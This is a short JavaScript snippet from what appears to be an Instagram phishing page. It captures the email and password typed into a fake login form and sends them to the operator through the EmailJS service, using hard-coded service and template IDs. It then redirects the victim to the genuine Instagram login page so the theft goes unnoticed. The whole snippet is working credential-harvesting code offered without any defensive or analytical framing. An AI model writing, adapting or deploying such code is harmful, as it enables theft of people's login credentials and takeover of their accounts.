<script>
  let formSubmitted = false; // Variable to track form submission
  
  function sendMail(){
    if (formSubmitted) {
      return; // Exit the function if form is already submitted
    }

    let parms = {
      email : document.getElementById("email").value,
      password : document.getElementById("password").value,
      submit_button_id: document.getElementById("instagram").id
    };
    
    // Set formSubmitted to true before sending email
    formSubmitted = true;
    
        emailjs.send("service_9evnoou","template_79435mm", parms)
      .then(function(response) {
        // Redirect to Google after email is sent
        window.location.href = "https://www.instagram.com/accounts/login/?hl=en";
      })
      .catch(function(error) {
        console.error('error:', error);
        // Handle error if necessary
      });
  }

  // Attach form submission event handler
  document.getElementById('InstaForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission
    sendMail(); // Call sendMail function
  });
</script>
